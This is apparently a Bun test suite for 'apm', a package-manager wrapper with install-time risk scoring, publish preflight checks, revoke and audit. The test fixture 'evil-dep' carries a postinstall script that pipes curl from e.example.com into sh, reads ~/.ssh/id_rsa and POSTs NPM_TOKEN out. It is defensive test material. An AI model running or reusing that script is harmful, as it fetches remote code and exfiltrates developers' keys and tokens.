// Spec: `apm` wraps whatever package manager the project uses (bun first, npm and pnpm too).
// It adds a score gate before install, a preflight before publish, and one-step revoke and audit.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startRegistry, addUser, makeSandbox, writePackage, writeConsumer, run, apm, getJson, installedVersion, dig, type Registry } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
let clock = Date.parse("2026-06-01T00:00:00Z");
let reg: Registry;
let alice: string;
let mallory: string;
let work: string;

async function publish(name: string, version: string, token: string, extra: Partial<Parameters<typeof writePackage>[1]> = {}): Promise<void> {
  const sb = makeSandbox(reg, token);
  const d = writePackage(work, { name, version, ...extra }, reg, token);
  const r = await run(["bun", "publish"], { cwd: d, env: sb.env });
  if (r.code !== 0) throw new Error(`publish ${name}@${version} failed: ${r.out}`);
}

function bunProject(deps: Record<string, string> = {}, token?: string): string {
  // no lockfile yet: bun is the default when it is installed
  return writeConsumer(work, reg, token, deps);
}

beforeAll(async () => {
  reg = await startRegistry({ now: () => clock });
  alice = await addUser(reg, "alice");
  mallory = await addUser(reg, "mallory");
  work = mkdtempSync(join(tmpdir(), "apm-cli-"));
  await publish("nice-dep", "1.0.0", alice);
  await publish("nice-dep", "1.1.0", alice);
  await publish("evil-dep", "1.0.0", mallory, {
    scripts: { postinstall: "node x.js" },
    files: { "index.js": "module.exports=1;\n", "x.js": "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.ssh/id_rsa'); fetch('https://e.example.com',{method:'POST',body:process.env.NPM_TOKEN}); eval('1');\n" },
  });
  await publish("to-revoke", "1.0.0", alice);
  clock += 10 * DAY;
});
afterAll(async () => {
  await reg?.stop();
});

describe("apm: runtime detection and pass-through", () => {
  test("apm add in a bun project installs through bun and prints the score", async () => {
    const sb = makeSandbox(reg, alice);
    const app = bunProject({}, alice);
    const r = await apm(["add", "nice-dep"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(r.out).toMatch(/nice-dep@1\.1\.0/);
    expect(r.out).toMatch(/score\s+\d+/i);
    expect(r.out.toLowerCase()).toContain("bun");
    expect(installedVersion(app, "nice-dep")).toBe("1.1.0");
    const pkg: unknown = JSON.parse(readFileSync(join(app, "package.json"), "utf8"));
    expect(String(dig(pkg, "dependencies", "nice-dep"))).toContain("1.1.0");
  });

  test("apm add in an npm project (package-lock.json) installs through npm", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice, {});
    const first = await run(["npm", "install"], { cwd: app, env: sb.env });
    expect(first.code, first.out).toBe(0);
    expect(existsSync(join(app, "package-lock.json"))).toBe(true);
    const r = await apm(["add", "nice-dep"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(r.out.toLowerCase()).toContain("npm");
    expect(installedVersion(app, "nice-dep")).toBe("1.1.0");
    expect(existsSync(join(app, "bun.lock"))).toBe(false);
  });

  test("unknown commands pass straight through to the package manager", async () => {
    const sb = makeSandbox(reg, alice);
    const app = bunProject({}, alice);
    const pkg: unknown = JSON.parse(readFileSync(join(app, "package.json"), "utf8"));
    writeFileSync(join(app, "package.json"), JSON.stringify({ ...Object(pkg), scripts: { hello: "echo hello-from-script" } }));
    const r = await apm(["run", "hello"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(r.out).toContain("hello-from-script");
  });

  test("apm add in a pnpm project installs through pnpm", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice, {});
    writeFileSync(join(app, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n\nimporters:\n\n  .: {}\n");
    const r = await apm(["add", "nice-dep"], { cwd: app, env: { ...sb.env, npm_config_store_dir: join(sb.home, ".pnpm-store") } });
    expect(r.code, r.out).toBe(0);
    expect(r.out.toLowerCase()).toContain("pnpm");
    expect(installedVersion(app, "nice-dep")).toBe("1.1.0");
  });

  test("apm add --json prints one machine-readable result and never prompts", async () => {
    const sb = makeSandbox(reg, alice);
    const app = bunProject({}, alice);
    const r = await apm(["add", "evil-dep", "--json", "--strict"], { cwd: app, env: sb.env });
    expect(r.code).not.toBe(0);
    const body: unknown = JSON.parse(r.stdout);
    expect(dig(body, "ok")).toBe(false);
    expect(dig(body, "packages", 0, "name")).toBe("evil-dep");
    expect(typeof dig(body, "packages", 0, "score")).toBe("number");
    // by default it installs, and the JSON carries the warning
    const warned = await apm(["add", "evil-dep", "--json"], { cwd: bunProject({}, alice), env: sb.env });
    const doc: unknown = JSON.parse(warned.stdout);
    expect(warned.code, warned.out).toBe(0);
    expect(dig(doc, "ok")).toBe(true);
    expect(dig(doc, "packages", 0, "warnings", 0, "kind")).toBe("low-score");
  });

  test("--pm overrides detection", async () => {
    const sb = makeSandbox(reg, alice);
    const app = bunProject({}, alice);
    const r = await apm(["add", "nice-dep", "--pm", "npm"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(existsSync(join(app, "package-lock.json"))).toBe(true);
  });
});

describe("apm: install gate", () => {
  // a score informs, it does not block (the owner's policy, 2026-11): the warning names the score, the reasons and a link
  test("apm add warns about a package that scores below the floor, says why, and installs it", async () => {
    const sb = makeSandbox(reg, alice);
    const app = bunProject({}, alice);
    const r = await apm(["add", "evil-dep"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(r.out).toMatch(/WARNING.*evil-dep@1\.0\.0.*scores \d+\/100 \(F\), under the floor of 40/);
    expect(r.out).toMatch(/x\.js:1/);
    expect(r.out).toContain("/package/evil-dep/v/1.0.0");
    expect(r.out).toContain("--strict");
    expect(installedVersion(app, "evil-dep")).toBe("1.0.0");
  });

  test("apm add --strict (or APM_STRICT=1) refuses a package that scores below the floor and explains why", async () => {
    const sb = makeSandbox(reg, alice);
    const app = bunProject({}, alice);
    const viaEnv = await apm(["add", "evil-dep"], { cwd: app, env: { ...sb.env, APM_STRICT: "1" } });
    expect(viaEnv.code).not.toBe(0);
    const r = await apm(["add", "evil-dep", "--strict"], { cwd: app, env: sb.env });
    expect(r.code).not.toBe(0);
    expect(r.out).toContain("evil-dep");
    expect(r.out.toLowerCase()).toContain("install-script");
    expect(r.out).toContain("--force");
    expect(installedVersion(app, "evil-dep")).toBeNull();
  });

  test("--force installs it anyway", async () => {
    const sb = makeSandbox(reg, alice);
    const app = bunProject({}, alice);
    const r = await apm(["add", "evil-dep", "--force"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "evil-dep")).toBe("1.0.0");
  });

  // review of 2fbf383, finding 1: a version inside the cooldown is the one npm and bun install, so apm add installs and
  // checks it with a warning; --strict falls back to the newest older version, as apm add did in every mode before
  test("apm add installs a version younger than the 24h cooldown with a warning; --strict skips it", async () => {
    await publish("nice-dep", "1.2.0", alice); // brand new
    const sb = makeSandbox(reg, alice);
    const app = bunProject({}, alice);
    const r = await apm(["add", "nice-dep"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "nice-dep")).toBe("1.2.0");
    expect(r.out).toContain("inside apm's 24-hour cooldown");
    const strictApp = bunProject({}, alice);
    const strict = await apm(["add", "nice-dep", "--strict"], { cwd: strictApp, env: sb.env });
    expect(strict.code, strict.out).toBe(0);
    expect(installedVersion(strictApp, "nice-dep")).toBe("1.1.0");
    expect(strict.out).toContain("skipped 1.2.0");
    const app2 = bunProject({}, alice);
    const r2 = await apm(["add", "nice-dep", "--no-cooldown"], { cwd: app2, env: sb.env });
    expect(r2.code, r2.out).toBe(0);
    expect(installedVersion(app2, "nice-dep")).toBe("1.2.0");
    expect(r2.out).not.toContain("inside apm's 24-hour cooldown");
  });
});

describe("apm: score, name, audit", () => {
  test("apm score prints the number, grade and signals", async () => {
    const sb = makeSandbox(reg, alice);
    const r = await apm(["score", "evil-dep"], { cwd: sb.home, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(r.out).toMatch(/\b\d{1,3}\/100\b/);
    expect(r.out).toContain("install-script");
    // it reads ~/.ssh/id_rsa at install: a risk signal; what it can do is listed apart, not scored
    expect(r.out).toContain("credential-read");
    expect(r.out).toContain("capabilities");
    expect(r.out).toContain("network");
  });

  test("apm score --json is machine readable", async () => {
    const sb = makeSandbox(reg, alice);
    const r = await apm(["score", "nice-dep@1.0.0", "--json"], { cwd: sb.home, env: sb.env });
    expect(r.code, r.out).toBe(0);
    const body: unknown = JSON.parse(r.stdout);
    expect(typeof dig(body, "score")).toBe("number");
  });

  test("apm name checks availability like a domain search", async () => {
    const sb = makeSandbox(reg, alice);
    const taken = await apm(["name", "nice-dep"], { cwd: sb.home, env: sb.env });
    expect(taken.out.toLowerCase()).toContain("taken");
    const free = await apm(["name", "totally-free-name-xyz"], { cwd: sb.home, env: sb.env });
    expect(free.out.toLowerCase()).toContain("available");
  });

  test("apm audit fails when an installed version was revoked", async () => {
    const sb = makeSandbox(reg, alice);
    const app = bunProject({}, alice);
    const add = await apm(["add", "to-revoke"], { cwd: app, env: sb.env });
    expect(add.code, add.out).toBe(0);
    const clean = await apm(["audit"], { cwd: app, env: sb.env });
    expect(clean.code, clean.out).toBe(0);
    const rv = await apm(["revoke", "to-revoke@1.0.0", "--reason", "leaked secrets", "--password-stdin"], { cwd: app, env: sb.env, stdin: "correct-horse-battery\n" });
    expect(rv.code, rv.out).toBe(0);
    const audit = await apm(["audit"], { cwd: app, env: sb.env });
    expect(audit.code).not.toBe(0);
    expect(audit.out).toContain("to-revoke@1.0.0");
    expect(audit.out).toContain("leaked secrets");
  });
});

describe("apm: publish", () => {
  test("apm publish --dry-run lists the files and the score preview without uploading", async () => {
    const sb = makeSandbox(reg, alice);
    const d = writePackage(work, { name: "dry-runner", version: "1.0.0", files: { "index.js": "module.exports=1;\n", "README.md": "# hi\n" } }, reg, alice);
    const r = await apm(["publish", "--dry-run"], { cwd: d, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(r.out).toContain("index.js");
    expect(r.out).toMatch(/score\s+\d+/i);
    const { status } = await getJson(`${reg.url}dry-runner`);
    expect(status).toBe(404);
  });

  test("apm publish refuses locally when a secret would ship, before any upload", async () => {
    const sb = makeSandbox(reg, alice);
    const d = writePackage(work, { name: "oops-secret", version: "1.0.0", files: { "index.js": "module.exports=1;\n", ".env.production": "STRIPE_SECRET_KEY=sk_live_51HxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxQ\n" } }, reg, alice);
    const r = await apm(["publish"], { cwd: d, env: sb.env });
    expect(r.code).not.toBe(0);
    expect(r.out).toContain(".env.production");
    expect(r.out.toLowerCase()).toContain("files");
    const { status } = await getJson(`${reg.url}oops-secret`);
    expect(status).toBe(404);
  });

  test("apm publish refuses when main points at a file that will not ship", async () => {
    const sb = makeSandbox(reg, alice);
    const d = writePackage(work, { name: "no-build", version: "1.0.0", files: { "src/index.ts": "export const x = 1;\n" }, extra: { main: "dist/index.js" } }, reg, alice);
    const r = await apm(["publish"], { cwd: d, env: sb.env });
    expect(r.code).not.toBe(0);
    expect(r.out).toContain("dist/index.js");
  });

  test("apm publish --bump patch bumps, publishes and shows the result", async () => {
    const sb = makeSandbox(reg, alice);
    const d = writePackage(work, { name: "bumpy", version: "1.0.0" }, reg, alice);
    const first = await apm(["publish"], { cwd: d, env: sb.env });
    expect(first.code, first.out).toBe(0);
    const r = await apm(["publish", "--bump", "patch"], { cwd: d, env: sb.env });
    expect(r.code, r.out).toBe(0);
    const pkg: unknown = JSON.parse(readFileSync(join(d, "package.json"), "utf8"));
    expect(dig(pkg, "version")).toBe("1.0.1");
    const { body } = await getJson(`${reg.url}bumpy`);
    expect(dig(body, "dist-tags", "latest")).toBe("1.0.1");
    expect(r.out).toContain("bumpy@1.0.1");
  });

  test("apm publish works in a project that only has npm", async () => {
    const sb = makeSandbox(reg, alice);
    const d = writePackage(work, { name: "npm-only-lib", version: "0.1.0" }, reg, alice);
    writeFileSync(join(d, "package-lock.json"), JSON.stringify({ name: "npm-only-lib", version: "0.1.0", lockfileVersion: 3, requires: true, packages: { "": { name: "npm-only-lib", version: "0.1.0" } } }));
    const r = await apm(["publish"], { cwd: d, env: sb.env });
    expect(r.code, r.out).toBe(0);
    const { body } = await getJson(`${reg.url}npm-only-lib`);
    expect(dig(body, "dist-tags", "latest")).toBe("0.1.0");
  });
});

describe("apm x: run a package binary with a risk card first", () => {
  test("apm x shows the score card, then runs the binary", async () => {
    await publish("hello-bin", "1.0.0", alice, { extra: { bin: { "hello-bin": "cli.js" } }, files: { "index.js": "module.exports=1;\n", "cli.js": "#!/usr/bin/env node\nconsole.log('hi from bin');\n" } });
    clock += 2 * DAY;
    const sb = makeSandbox(reg, alice);
    const r = await apm(["x", "hello-bin"], { cwd: sb.home, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(r.out).toMatch(/score\s+\d+/i);
    expect(r.out).toContain("hi from bin");
  });

  test("apm x refuses to run a dangerous package", async () => {
    const sb = makeSandbox(reg, alice);
    const r = await apm(["x", "evil-dep"], { cwd: sb.home, env: sb.env });
    expect(r.code).not.toBe(0);
    expect(r.out).toContain("evil-dep");
  });
});

describe("apm: login", () => {
  test("apm login stores a token that stock npm and bun then use", async () => {
    const sb = makeSandbox(reg);
    const r = await apm(["login", "--username", "carol", "--password-stdin"], { cwd: sb.home, env: sb.env, stdin: "a-long-enough-password\n" });
    expect(r.code, r.out).toBe(0);
    const who = await run(["npm", "whoami"], { cwd: sb.home, env: sb.env });
    expect(who.code, who.out).toBe(0);
    expect(who.stdout.trim()).toBe("carol");
    const apmWho = await apm(["whoami"], { cwd: sb.home, env: sb.env });
    expect(apmWho.out).toContain("carol");
  });
});
